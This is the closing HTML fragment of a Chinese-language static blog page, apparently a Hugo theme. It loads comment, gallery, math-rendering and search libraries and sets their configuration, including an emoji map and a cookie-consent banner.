<div class="pjax-assets"><script type="text/javascript" src="/lib/valine/Valine.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lightgallery.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-thumbnail.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-zoom.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":100},"comment":{"valine":{"appId":"NqPgdtSDypPamJXs5oU1YBdT-MdYXbMMI","appKey":"apsTndIP3sz1TTaclFwFOFbL","avatar":"retro","el":"#valine","emojiCDN":"https://cdn.jsdelivr.net/npm/emoji-datasource-google@5.0.1/img/google/64/","emojiMaps":{"100":"1f4af.png","alien":"1f47d.png","anger":"1f4a2.png","angry":"1f620.png","anguished":"1f627.png","astonished":"1f632.png","black_heart":"1f5a4.png","blue_heart":"1f499.png","blush":"1f60a.png","bomb":"1f4a3.png","boom":"1f4a5.png","broken_heart":"1f494.png","brown_heart":"1f90e.png","clown_face":"1f921.png","cold_face":"1f976.png","cold_sweat":"1f630.png","confounded":"1f616.png","confused":"1f615.png","cry":"1f622.png","crying_cat_face":"1f63f.png","cupid":"1f498.png","dash":"1f4a8.png","disappointed":"1f61e.png","disappointed_relieved":"1f625.png","dizzy":"1f4ab.png","dizzy_face":"1f635.png","drooling_face":"1f924.png","exploding_head":"1f92f.png","expressionless":"1f611.png","face_vomiting":"1f92e.png","face_with_cowboy_hat":"1f920.png","face_with_hand_over_mouth":"1f92d.png","face_with_head_bandage":"1f915.png","face_with_monocle":"1f9d0.png","face_with_raised_eyebrow":"1f928.png","face_with_rolling_eyes":"1f644.png","face_with_symbols_on_mouth":"1f92c.png","face_with_thermometer":"1f912.png","fearful":"1f628.png","flushed":"1f633.png","frowning":"1f626.png","ghost":"1f47b.png","gift_heart":"1f49d.png","green_heart":"1f49a.png","grimacing":"1f62c.png","grin":"1f601.png","grinning":"1f600.png","hankey":"1f4a9.png","hear_no_evil":"1f649.png","heart":"2764-fe0f.png","heart_decoration":"1f49f.png","heart_eyes":"1f60d.png","heart_eyes_cat":"1f63b.png","heartbeat":"1f493.png","heartpulse":"1f497.png","heavy_heart_exclamation_mark_ornament":"2763-fe0f.png","hole":"1f573-fe0f.png","hot_face":"1f975.png","hugging_face":"1f917.png","hushed":"1f62f.png","imp":"1f47f.png","innocent":"1f607.png","japanese_goblin":"1f47a.png","japanese_ogre":"1f479.png","joy":"1f602.png","joy_cat":"1f639.png","kiss":"1f48b.png","kissing":"1f617.png","kissing_cat":"1f63d.png","kissing_closed_eyes":"1f61a.png","kissing_heart":"1f618.png","kissing_smiling_eyes":"1f619.png","laughing":"1f606.png","left_speech_bubble":"1f5e8-fe0f.png","love_letter":"1f48c.png","lying_face":"1f925.png","mask":"1f637.png","money_mouth_face":"1f911.png","nauseated_face":"1f922.png","nerd_face":"1f913.png","neutral_face":"1f610.png","no_mouth":"1f636.png","open_mouth":"1f62e.png","orange_heart":"1f9e1.png","partying_face":"1f973.png","pensive":"1f614.png","persevere":"1f623.png","pleading_face":"1f97a.png","pouting_cat":"1f63e.png","purple_heart":"1f49c.png","rage":"1f621.png","relaxed":"263a-fe0f.png","relieved":"1f60c.png","revolving_hearts":"1f49e.png","right_anger_bubble":"1f5ef-fe0f.png","robot_face":"1f916.png","rolling_on_the_floor_laughing":"1f923.png","scream":"1f631.png","scream_cat":"1f640.png","see_no_evil":"1f648.png","shushing_face":"1f92b.png","skull":"1f480.png","skull_and_crossbones":"2620-fe0f.png","sleeping":"1f634.png","sleepy":"1f62a.png","slightly_frowning_face":"1f641.png","slightly_smiling_face":"1f642.png","smile":"1f604.png","smile_cat":"1f638.png","smiley":"1f603.png","smiley_cat":"1f63a.png","smiling_face_with_3_hearts":"1f970.png","smiling_imp":"1f608.png","smirk":"1f60f.png","smirk_cat":"1f63c.png","sneezing_face":"1f927.png","sob":"1f62d.png","space_invader":"1f47e.png","sparkling_heart":"1f496.png","speak_no_evil":"1f64a.png","speech_balloon":"1f4ac.png","star-struck":"1f929.png","stuck_out_tongue":"1f61b.png","stuck_out_tongue_closed_eyes":"1f61d.png","stuck_out_tongue_winking_eye":"1f61c.png","sunglasses":"1f60e.png","sweat":"1f613.png","sweat_drops":"1f4a6.png","sweat_smile":"1f605.png","thinking_face":"1f914.png","thought_balloon":"1f4ad.png","tired_face":"1f62b.png","triumph":"1f624.png","two_hearts":"1f495.png","unamused":"1f612.png","upside_down_face":"1f643.png","weary":"1f629.png","white_frowning_face":"2639-fe0f.png","white_heart":"1f90d.png","wink":"1f609.png","woozy_face":"1f974.png","worried":"1f61f.png","yawning_face":"1f971.png","yellow_heart":"1f49b.png","yum":"1f60b.png","zany_face":"1f92a.png","zipper_mouth_face":"1f910.png","zzz":"1f4a4.png"},"enableQQ":false,"highlight":true,"lang":"zh-cn","pageSize":10,"placeholder":"说点儿什么...","recordIP":true,"visitor":true}},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","lunrLanguageCode":"zh","lunrSegmentitURL":"/lib/lunr/lunr.segmentit.js","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"lunr"},"sharerjs":true};</script><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/valine/valine.min.css">
    <noscript><link rel="stylesheet" href="/lib/valine/valine.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/lightgallery/lightgallery.min.css">
    <noscript><link rel="stylesheet" href="/lib/lightgallery/lightgallery.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/katex/katex.min.css">
    <noscript><link rel="stylesheet" href="/lib/katex/katex.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/katex/copy-tex.min.css">
    <noscript><link rel="stylesheet" href="/lib/katex/copy-tex.min.css"></noscript></div>
</body>

</html>